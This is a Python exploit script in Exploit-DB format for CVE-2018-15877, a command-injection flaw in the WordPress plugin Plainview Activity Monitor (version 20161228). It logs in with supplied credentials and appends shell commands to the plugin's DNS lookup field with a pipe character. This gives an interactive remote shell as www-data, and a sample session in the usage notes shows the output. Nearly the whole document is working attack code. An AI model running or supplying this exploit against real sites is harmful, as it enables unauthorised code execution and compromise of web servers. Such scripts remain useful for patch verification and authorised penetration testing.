# Exploit Title: WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)
# Date: 07.07.2021
# Exploit Author: Beren Kuday GORUN
# Vendor Homepage: https://wordpress.org/plugins/plainview-activity-monitor/
# Software Link: https://www.exploit-db.com/apps/2e1f384e5e49ab1d5fbf9eedf64c9a15-plainview-activity-monitor.20161228.zip
# Version: 20161228 and possibly prior
# Fixed version: 20180826
# CVE : CVE-2018-15877

"""
-------------------------
Usage:
┌──(root@kali)-[~/tools]
└─# python3 WordPress-Activity-Monitor-RCE.py
What's your target IP?
192.168.101.28
What's your username?
mark
What's your password?
password123
[*] Please wait...
[*] Perfect!
www-data@192.168.101.28  whoami
www-data
www-data@192.168.101.28  pwd
/var/www/html/wp-admin
www-data@192.168.101.28  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
"""

import requests
from bs4 import BeautifulSoup

TIMEOUT = 10
MARKER = "<p>Output from dig: </p>"


def normalize_target(raw_ip):
    """Accept 'TARGET_IP', 'http://TARGET_IP/', 'TARGET_IP:port'."""
    target = raw_ip.strip()
    for prefix in ("http://", "https://"):
        if target.lower().startswith(prefix):
            target = target[len(prefix):]
    target = target.split("/")[0].strip()
    return target


def build_base(target, use_https=False):
    scheme = "https" if use_https else "http"
    return f"{scheme}://{target}"


def login(base_url, username, password):
    """Login via wp-login.php and return an authenticated Session, or None."""
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    url = base_url + "/wp-login.php"
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": base_url + "/wp-admin/",
        "testcookie": "1",
    }
    try:
        r = s.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
    except requests.RequestException as e:
        print(f"[!] Login request failed: {e}")
        return None

    # WordPress sets wordpress_logged_in_* on success
    if not any("wordpress_logged_in" in c for c in s.cookies.get_dict()):
        print("[!] Login failed: no wordpress_logged_in cookie.")
        print(f"    HTTP {r.status_code}. Check username/password and wp-login.php.")
        return None

    # Confirm we can reach wp-admin (not bounced back to login)
    try:
        check = s.get(base_url + "/wp-admin/", timeout=TIMEOUT, allow_redirects=True)
        if "wp-login.php" in check.url and "reauth=1" in check.url:
            print("[!] Session not authenticated for wp-admin.")
            return None
    except requests.RequestException as e:
        print(f"[!] wp-admin check failed: {e}")
        return None

    return s


def extract_dig_output(html):
    """Return command output from vulnerable page HTML, or None."""
    if MARKER not in html:
        return None
    try:
        html_doc = html.split(MARKER)[1]
    except IndexError:
        return None
    soup = BeautifulSoup(html_doc, "html.parser")
    if not soup.p:
        return None
    return soup.p.get_text().strip()


def run_command(session, base_url, cmd):
    """Send one injected command. Returns output string or None."""
    url = base_url + "/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"
    payload = "google.com.tr | " + cmd
    data = {"ip": payload, "lookup": "lookup"}
    try:
        r = session.post(url, data=data, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[!] Command request failed: {e}")
        return None
    if r.status_code != 200:
        print(f"[!] Unexpected HTTP {r.status_code} from activity_tools page.")
        return None
    out = extract_dig_output(r.text)
    if out is None:
        print("[!] No dig output found. Plugin missing/patched or session expired.")
        # Debug hint: uncomment to see raw response
        # print(r.text[:2000])
        return None
    return out


def exploit(session, base_url, whoami, ip_label):
    while True:
        try:
            cmd = input(whoami + "@" + ip_label + "  ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Bye.")
            break
        if not cmd:
            continue
        if cmd.lower() in ("exit", "quit", "q"):
            print("[*] Bye.")
            break
        out = run_command(session, base_url, cmd)
        if out is not None:
            print(out)


def poc(session, base_url, ip_label):
    out = run_command(session, base_url, "whoami")
    if out is None or not out:
        print("[!] POC failed: 'whoami' returned nothing. Target likely not vulnerable.")
        return
    print("[*] Perfect! ")
    exploit(session, base_url, out.strip().split("\n")[0], ip_label)


def main():
    raw_ip = input("What's your target IP?\n")
    username = input("What's your username?\n")
    password = input("What's your password?\n")
    print("[*] Please wait...")

    target = normalize_target(raw_ip)
    if not target:
        print("[!] Empty target.")
        return
    base_url = build_base(target)

    session = login(base_url, username, password)
    if session is None:
        return
    poc(session, base_url, target)


if __name__ == "__main__":
    main()